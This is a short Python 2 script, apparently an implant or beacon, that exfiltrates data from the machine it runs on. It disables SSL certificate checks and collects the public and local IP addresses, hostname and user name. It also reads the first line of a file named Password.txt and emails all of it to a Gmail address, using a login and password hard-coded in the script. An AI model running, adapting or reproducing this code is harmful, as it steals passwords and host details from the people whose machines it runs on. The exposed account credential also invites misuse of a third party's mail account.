import smtplib
import socket
import getpass
from json import load
from urllib2 import urlopen, Request

import os
import ssl
if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
        getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context

url = "http://jsonip.com"
request_site = Request(url, headers={"User-Agent": "Mozilla/5.0"})
ipv6 = load(urlopen(request_site))['ip']

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ipv4 = str(s.getsockname()[0])
s.close()

un = socket.gethostname() + ".modem"

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

msg = MIMEMultipart()
msg['From'] = '403.th3ta@gmail.com'
msg['To'] = '403.th3ta@gmail.com'
msg['Subject'] = socket.gethostname()
with open('/Users/Shared/Loki/Password.txt') as f:
    first_line = f.readline()
message = getpass.getuser() + "\n" + first_line + "\n" + ipv6 + "\n" + ipv4 + "\n" + un
msg.attach(MIMEText(message))

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login("403.th3ta@gmail.com", "unosryrgbvyjrxib")
server.sendmail(
    "403.th3ta@gmail.com",
    "403.th3ta@gmail.com",
    msg.as_string())
server.quit()
